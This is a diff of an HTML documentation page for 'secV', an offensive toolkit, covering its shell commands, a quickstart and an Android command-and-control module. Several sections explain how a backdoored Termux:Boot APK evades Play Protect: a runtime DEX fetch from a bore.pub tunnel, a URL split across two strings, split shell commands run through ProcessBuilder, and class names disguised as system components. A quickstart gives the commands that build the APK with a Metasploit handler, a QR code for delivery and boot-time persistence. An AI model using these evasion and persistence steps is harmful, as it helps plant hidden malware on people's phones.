+        <div class="chain-content-body">The APK contains only the DexClassLoader fetcher. Play Protect's static DEX scanner finds nothing to flag because there are no Metasploit signatures in the installed package. The real payload is fetched at runtime to <span class="chain-content-code">getCodeCacheDir()</span> which is not scanned during boot.</div>
       </div>
     </div>
     <div class="chain-step">
       <div class="chain-num">B</div>
       <div>
         <div class="chain-content-title">URL split across two string constants</div>
-        <div class="chain-content-body">
-          The smali for the DEX fetch URL is
-          <span class="chain-content-code">const-string v0, "http://bore"</span> +
-          <span class="chain-content-code">const-string v1, ".pub:21062/s.dex"</span>
-          concatenated at runtime. A single
-          <span class="chain-content-code">http://bore.pub:21062/s.dex</span>
-          constant would be trivially flagged by string-matching scanners.
-        </div>
+        <div class="chain-content-body">The smali for the DEX fetch URL is <span class="chain-content-code">const-string v0, "http://bore"</span> + <span class="chain-content-code">const-string v1, ".pub:21062/s.dex"</span> concatenated at runtime, defeating single-string-constant matching scanners.</div>
       </div>
     </div>
     <div class="chain-step">
       <div class="chain-num">C</div>
       <div>
-        <div class="chain-content-title">ProcessBuilder + split command string in launchAgent()</div>
-        <div class="chain-content-body">
-          The boot script launcher uses
-          <span class="chain-content-code">ProcessBuilder</span> (less heuristically flagged
-          than <span class="chain-content-code">Runtime.exec()</span>) and splits the shell
-          command string at the midpoint so no single suspicious string constant is visible
-          to static analysis. The halves are concatenated at runtime via
-          <span class="chain-content-code">String.concat()</span>.
-        </div>
+        <div class="chain-content-title">ProcessBuilder + split command string</div>
+        <div class="chain-content-body">Uses <span class="chain-content-code">ProcessBuilder</span> (less heuristically flagged than <span class="chain-content-code">Runtime.exec()</span>) and splits the shell command string at the midpoint, concatenated at runtime via <span class="chain-content-code">String.concat()</span>.</div>
       </div>
     </div>
     <div class="chain-step">
       <div class="chain-num">D</div>
       <div>
         <div class="chain-content-title">Disguised class names</div>
-        <div class="chain-content-body">
-          The DexClassLoader injected class is placed at
-          <span class="chain-content-code">com.android.system.health.Payload</span> - a path
-          that resembles a legitimate Android system health service.
-          <span class="chain-content-code">AgentService</span> lives at
-          <span class="chain-content-code">com.termux.boot.AgentService</span> - part of the
-          Termux:Boot package namespace, indistinguishable from a real Termux component.
-        </div>
+        <div class="chain-content-body">DexClassLoader class placed at <span class="chain-content-code">com.android.system.health.Payload</span>. <span class="chain-content-code">AgentService</span> lives at <span class="chain-content-code">com.termux.boot.AgentService</span> — indistinguishable from a real Termux component.</div>
       </div>
     </div>
   </div>
-
 </div>
 
 <hr class="rule">
 
-<!-- Shell Reference -->
+<!-- SHELL -->
 <div class="wrap" id="shell">
-  <p class="section-label">Shell Reference</p>
-  <h2>secV Shell</h2>
+  <div class="section-label">
+    <span class="section-num">05</span>
+    <span>Shell Reference</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>secV <span class="h2-stroke">Shell</span></h2>
 
-  <div class="shell-section">
+  <div class="shell-section reveal">
     <div class="shell-header">
       <span class="shell-title">Module Commands</span>
       <span class="shell-version">v2.5.0+</span>
     </div>
     <table class="cmd-table">
       <tr class="cmd-group-header"><td colspan="2">Loading Modules</td></tr>
-      <tr><td>use &lt;module&gt;</td><td>Load a module by name (e.g. <code>use netrecon</code>). Tab completes module names from the tools/ discovery scan.</td></tr>
+      <tr><td>use &lt;module&gt;</td><td>Load a module by name. Tab completes module names from the tools/ discovery scan.</td></tr>
       <tr><td>back</td><td>Unload the current module and clear params. Equivalent to <code>cd ..</code></td></tr>
       <tr><td>reload</td><td>Rescan the tools directory for new or updated modules without restarting</td></tr>
-
       <tr class="cmd-group-header"><td colspan="2">Configuration</td></tr>
-      <tr><td>set &lt;param&gt; &lt;value&gt;</td><td>Set a module parameter. <strong>First token after <code>set</code> is always the key.</strong> Values with spaces do not need quotes. E.g. <code>set operation backdoor_apk</code></td></tr>
+      <tr><td>set &lt;param&gt; &lt;value&gt;</td><td>Set a module parameter. Values with spaces do not need quotes. e.g. <code>set operation backdoor_apk</code></td></tr>
       <tr><td>unset &lt;param&gt;</td><td>Clear a single parameter</td></tr>
       <tr><td>show options</td><td>List all parameters: name, type, required flag, current value, and help text</td></tr>
-
       <tr class="cmd-group-header"><td colspan="2">Execution</td></tr>
       <tr><td>run &lt;target&gt;</td><td>Execute the loaded module. Target is an IP, hostname, device serial, domain, or keyword (<code>connected</code>, <code>device</code>)</td></tr>
-
       <tr class="cmd-group-header"><td colspan="2">Information</td></tr>
       <tr><td>show modules</td><td>List all available modules grouped by category</td></tr>
       <tr><td>info [module]</td><td>Module details, version, author, dependency status, and example commands</td></tr>
       <tr><td>search &lt;keyword&gt;</td><td>Search modules by name, description, category, or tag</td></tr>
-      <tr><td>help module</td><td>Show full help for the currently loaded module including all operations</td></tr>
       <tr><td>sessions [list|interact &lt;id&gt;|kill &lt;id&gt;]</td><td>Manage active Meterpreter / shell sessions opened through android_pentest</td></tr>
-
       <tr class="cmd-group-header"><td colspan="2">Maintenance</td></tr>
-      <tr><td>update</td><td>Pull the latest version from git (runs <code>update.py</code> - rebuilds binary, syncs tool permissions)</td></tr>
+      <tr><td>update</td><td>Pull the latest version from git — rebuilds binary, syncs tool permissions</td></tr>
       <tr><td>clear</td><td>Clear the terminal screen</td></tr>
       <tr><td>exit / quit</td><td>Exit secV</td></tr>
     </table>
   </div>
 
-  <div class="shell-section">
+  <div class="shell-section reveal">
     <div class="shell-header">
       <span class="shell-title">Linux Navigation</span>
       <span class="shell-version">native passthrough</span>
     </div>
-    <p style="font-size:0.76rem;color:var(--muted);margin-bottom:1.4rem;line-height:1.8">
-      All standard Linux commands work natively inside secV. The shell tracks a working directory
-      and passes unknown commands through to the OS via <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">exec.Command</code>.
-      Use <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">cd ..</code>
-      to navigate up - if a module is loaded, this unloads it (same as <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">back</code>).
-    </p>
+    <p style="font-size:0.7rem;color:var(--dust);margin-bottom:1.25rem;line-height:1.8">All standard Linux commands work natively inside secV. The shell passes unknown commands through to the OS via <code style="font-family:var(--mono);font-size:0.64rem;color:var(--ash);background:var(--slab);border:1px solid var(--wall);padding:0.03rem 0.28rem;border-radius:3px">exec.Command</code>.</p>
     <table class="cmd-table">
       <tr class="cmd-group-header"><td colspan="2">Directory Navigation</td></tr>
       <tr><td>cd &lt;dir&gt;</td><td>Change working directory</td></tr>
       <tr><td>cd .. / cd ../</td><td>Go up one level. If a module is loaded, acts as <code>back</code></td></tr>
-      <tr><td>cd ~</td><td>Change to home directory</td></tr>
       <tr><td>pwd</td><td>Print current working directory</td></tr>
-
       <tr class="cmd-group-header"><td colspan="2">File Operations</td></tr>
       <tr><td>ls [path]</td><td>List directory contents</td></tr>
       <tr><td>ll / la</td><td>Long listing with hidden files</td></tr>
-      <tr><td>mkdir &lt;dir&gt;</td><td>Create a directory</td></tr>
       <tr><td>mv / cp / rm</td><td>Move, copy, or delete files</td></tr>
-      <tr><td>touch &lt;file&gt;</td><td>Create empty file or update timestamp</td></tr>
-
       <tr class="cmd-group-header"><td colspan="2">Viewing &amp; Search</td></tr>
       <tr><td>cat / less</td><td>Print or page file contents</td></tr>
-      <tr><td>head / tail</td><td>View start or end of a file</td></tr>
       <tr><td>grep "&lt;pattern&gt;" &lt;file&gt;</td><td>Search file contents</td></tr>
       <tr><td>find &lt;path&gt; -name "…"</td><td>Find files by name or pattern</td></tr>
-
-      <tr class="cmd-group-header"><td colspan="2">System Info</td></tr>
-      <tr><td>which &lt;binary&gt;</td><td>Find binary on PATH</td></tr>
-      <tr><td>whoami / id</td><td>Current user identity</td></tr>
-      <tr><td>chmod / chown</td><td>Change file permissions or ownership</td></tr>
     </table>
   </div>
 
-  <div class="shell-section">
+  <div class="shell-section reveal">
     <div class="shell-header">
       <span class="shell-title">Prompt Reference</span>
     </div>
-    <p style="font-size:0.76rem;color:var(--muted);margin-bottom:1rem;line-height:1.8">
-      The prompt adapts to show context: loaded module, active operation, and parameter count.
-    </p>
     <pre><code><span class="cm"># No module loaded</span>
 <span class="hl">secV</span> ❯
 
@@ -1755,103 +1371,98 @@ secV (android_pentest) › rebuild ❯ run device
 <span class="hl">secV</span> <span class="kw">android_pentest</span> ❯
 
 <span class="cm"># Module loaded, operation set, 3 params</span>
-<span class="hl">secV</span> <span class="kw">android_pentest</span> <span style="color:#585858">›</span> <span class="st">rebuild</span> [3 params] ❯
-
-<span class="cm"># After set msf true</span>
-<span class="hl">secV</span> <span class="kw">android_pentest</span> <span style="color:#585858">›</span> <span class="st">rebuild</span> [4 params] ❯
+<span class="hl">secV</span> <span class="kw">android_pentest</span> › <span class="st">rebuild</span> [3 params] ❯
 
 <span class="cm"># Scan in progress</span>
-<span class="hl">secV</span> <span class="kw">netrecon</span> <span style="color:#585858">›</span> <span class="st">full</span> [3 params] ❯</code></pre>
+<span class="hl">secV</span> <span class="kw">netrecon</span> › <span class="st">full</span> [3 params] ❯</code></pre>
   </div>
 </div>
 
 <hr class="rule">
 
-<!-- Quickstart -->
+<!-- QUICKSTART -->
 <div class="wrap" id="quickstart">
-  <p class="section-label">Getting Started</p>
-  <h2>Quickstart</h2>
+  <div class="section-label">
+    <span class="section-num">06</span>
+    <span>Getting Started</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>Quick<span class="h2-stroke">start</span></h2>
 
-  <div class="quickstart">
-    <div class="steps">
-
-      <div class="step">
-        <div class="step-num">01</div>
-        <div class="step-content">
-          <div class="step-title">Install secV</div>
-          <div class="step-body">Clone the repo and run the install script. It detects your distro, installs missing dependencies, compiles the Go binary, and makes all module scripts executable.</div>
-          <pre><code><span class="hl">git clone</span> https://github.com/secvulnhub/secV
+  <div class="steps">
+    <div class="step reveal">
+      <div class="step-num">01</div>
+      <div>
+        <div class="step-title">Install secV</div>
+        <div class="step-body">Clone the repo and run the install script. It detects your distro, installs missing dependencies, compiles the Go binary, and makes all module scripts executable.</div>
+        <pre><code><span class="hl">git clone</span> https://github.com/secvulnhub/secV
 <span class="hl">cd</span> secV
 <span class="hl">bash</span> install.sh</code></pre>
-        </div>
       </div>
+    </div>
 
-      <div class="step">
-        <div class="step-num">02</div>
-        <div class="step-content">
-          <div class="step-title">Launch the shell</div>
-          <div class="step-body">Run the <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">secV</code> binary. It auto-scans tools/ and loads all modules with tab-completion.</div>
-          <pre><code><span class="hl">./secV</span>        <span class="cm"># from repo directory</span>
-<span class="hl">secV</span>          <span class="cm"># if installed system-wide (install.sh option)</span></code></pre>
-        </div>
+    <div class="step reveal">
+      <div class="step-num">02</div>
+      <div>
+        <div class="step-title">Launch the shell</div>
+        <div class="step-body">Run the <code>secV</code> binary. It auto-scans tools/ and loads all modules with tab-completion.</div>
+        <pre><code><span class="hl">./secV</span>     <span class="cm"># from repo directory</span>
+<span class="hl">secV</span>       <span class="cm"># if installed system-wide</span></code></pre>
       </div>
+    </div>
 
-      <div class="step">
-        <div class="step-num">03</div>
-        <div class="step-content">
-          <div class="step-title">Network recon</div>
-          <div class="step-body">Scan a subnet, enumerate hosts, map open ports, detect device types, and pull live CVEs from NVD.</div>
-          <pre><code><span class="hl">use</span> netrecon
+    <div class="step reveal">
+      <div class="step-num">03</div>
+      <div>
+        <div class="step-title">Network recon</div>
+        <div class="step-body">Scan a subnet, enumerate hosts, map open ports, detect device types, and pull live CVEs from NVD.</div>
+        <pre><code><span class="hl">use</span> netrecon
 <span class="hl">set</span> mode deep
 <span class="hl">set</span> threads 30
 <span class="hl">run</span> 192.168.1.0/24</code></pre>
-        </div>
       </div>
+    </div>
 
-      <div class="step">
-        <div class="step-num">04</div>
-        <div class="step-content">
-          <div class="step-title">Android WAN C2 (boot persistence)</div>
-          <div class="step-body">Patch Termux:Boot, generate s.dex, get QR for delivery. Device connects back on every reboot via bore tunnels.</div>
-          <pre><code><span class="hl">use</span> android_pentest
+    <div class="step reveal">
+      <div class="step-num">04</div>
+      <div>
+        <div class="step-title">Android WAN C2 (boot persistence)</div>
+        <div class="step-body">Patch Termux:Boot, generate s.dex, get QR for delivery. Device connects back on every reboot via bore tunnels.</div>
+        <pre><code><span class="hl">use</span> android_pentest
 <span class="hl">set</span> operation rebuild
 <span class="hl">set</span> msf true
 <span class="hl">set</span> msf_lport 4444
-<span class="hl">run</span> device           <span class="cm"># builds APK + s.dex + QR</span>
+<span class="hl">run</span> device     <span class="cm"># builds APK + s.dex + QR</span>
 
-<span class="cm"># Start C2 stack (bore + MSF handler)</span>
+<span class="cm"># Start C2 stack</span>
 <span class="hl">bash</span> tools/mobile/android/c2_persistence/c2_watchdog.sh \
   --bore-dex-port 21062 --bore-msf-port 37993 \
-  --msf-port 4444 --dex-dir tools/mobile/android/apk_backdoor/output/ --notify
-
-<span class="cm"># Install: scan the QR → browser → install → reboot</span></code></pre>
-        </div>
+  --msf-port 4444 --dex-dir tools/mobile/android/apk_backdoor/output/ --notify</code></pre>
       </div>
+    </div>
 
-      <div class="step">
-        <div class="step-num">05</div>
-        <div class="step-content">
-          <div class="step-title">WiFi network monitoring</div>
-          <div class="step-body">Discover all hosts on a WiFi segment, fingerprint device categories, detect exposed threats like Telnet, FTP, or Redis.</div>
-          <pre><code><span class="hl">use</span> wifi_monitor
+    <div class="step reveal">
+      <div class="step-num">05</div>
+      <div>
+        <div class="step-title">WiFi network monitoring</div>
+        <div class="step-body">Discover all hosts on a WiFi segment, fingerprint device categories, detect exposed threats like Telnet, FTP, or Redis.</div>
+        <pre><code><span class="hl">use</span> wifi_monitor
 <span class="hl">set</span> mode full
 <span class="hl">set</span> interface wlan0
 <span class="hl">run</span> 192.168.1.0/24</code></pre>
-        </div>
       </div>
+    </div>
 
-      <div class="step">
-        <div class="step-num">06</div>
-        <div class="step-content">
-          <div class="step-title">Navigate like Linux</div>
-          <div class="step-body">Use <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">back</code> or <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">cd ..</code> to unload a module. Regular Linux commands work directly.</div>
-          <pre><code><span class="hl">ls</span> tools/network/
+    <div class="step reveal">
+      <div class="step-num">06</div>
+      <div>
+        <div class="step-title">Navigate like Linux</div>
+        <div class="step-body">Use <code>back</code> or <code>cd ..</code> to unload a module. Regular Linux commands work directly.</div>
+        <pre><code><span class="hl">ls</span> tools/network/
 <span class="hl">cat</span> tools/network/netrecon/module.json
-<span class="hl">back</span>      <span class="cm"># or: cd ..</span>
-<span class="hl">python3</span> update.py --sync-tools  <span class="cm"># fix permissions after git pull</span></code></pre>
-        </div>
+<span class="hl">back</span>
+<span class="hl">python3</span> update.py --sync-tools</code></pre>
       </div>
-
     </div>
   </div>
 </div>
@@ -1859,31 +1470,31 @@ secV (android_pentest) › rebuild ❯ run device
 <hr class="rule">
 
 <footer>
-  <a class="foot-brand" href="../../index.html">SecVulnHub</a>
-  <div class="foot-links">
-    <a class="foot-link" href="../../index.html">Home</a>
-    <a class="foot-link" href="https://github.com/secvulnhub" target="_blank">GitHub</a>
-    <a class="foot-link" href="#modules">Modules</a>
-    <a class="foot-link" href="#architecture">Architecture</a>
-    <a class="foot-link" href="#internals">Internals</a>
-    <a class="foot-link" href="#c2stack">C2 Stack</a>
+  <div class="foot-inner">
+    <a class="foot-brand" href="../../index.html">SECVULNHUB</a>
+    <div class="foot-links">
+      <a class="foot-link" href="../../index.html">Home</a>
+      <a class="foot-link" href="https://github.com/secvulnhub" target="_blank">GitHub</a>
+      <a class="foot-link" href="#modules">Modules</a>
+      <a class="foot-link" href="#architecture">Architecture</a>
+      <a class="foot-link" href="#c2stack">C2 Stack</a>
+    </div>
+    <span class="foot-note">MIT License · secV by 0xb0rn3</span>
   </div>
-  <span class="foot-note">MIT License · secV by 0xb0rn3</span>
 </footer>
 
 <script>
-// Nav scroll class
+/* NAV */
 const nav = document.getElementById('nav');
 window.addEventListener('scroll', () => {
   nav.classList.toggle('scrolled', scrollY > 20);
 }, { passive: true });
 
-// Burger menu
 document.getElementById('burger').addEventListener('click', () => {
   document.body.classList.toggle('nav-open');
 });
 
-// Copy install cmd
+/* COPY INSTALL */
 function copyInstall() {
   const text = document.getElementById('installCmd').textContent;
   navigator.clipboard.writeText(text).then(() => {
@@ -1895,31 +1506,14 @@ function copyInstall() {
   });
 }
 
-// Scroll-reveal: mark reveal targets
+/* SCROLL REVEAL */
 (function() {
-  const targets = [
-    '.module-card',
-    '.info-card',
-    '.step',
-    '.chain-step',
-    '.col-card',
-    '.callout',
-    '.arch-node',
-    '.shell-section',
-    '.project-banner',
-    'h2',
-    '.section-label',
-    '.body-text',
-    '.param-table',
-    '.arch-flow',
-  ];
-  const all = document.querySelectorAll(targets.join(','));
-  all.forEach(el => el.classList.add('reveal'));
+  const els = document.querySelectorAll('.reveal');
 
-  // stagger siblings in grids
+  // stagger grids
   document.querySelectorAll('.module-grid, .info-grid').forEach(grid => {
     grid.querySelectorAll('.reveal').forEach((el, i) => {
-      el.style.transitionDelay = `${i * 0.06}s`;
+      el.style.transitionDelay = `${i * 0.07}s`;
     });
   });
 
@@ -1930,9 +1524,9 @@ function copyInstall() {
         io.unobserve(e.target);
       }
     });
-  }, { threshold: 0.08, rootMargin: '0px 0px -40px 0px' });
+  }, { threshold: 0.06, rootMargin: '0px 0px -30px 0px' });
 
-  all.forEach(el => io.observe(el));
+  els.forEach(el => io.observe(el));
 })();
 </script>
 </body>
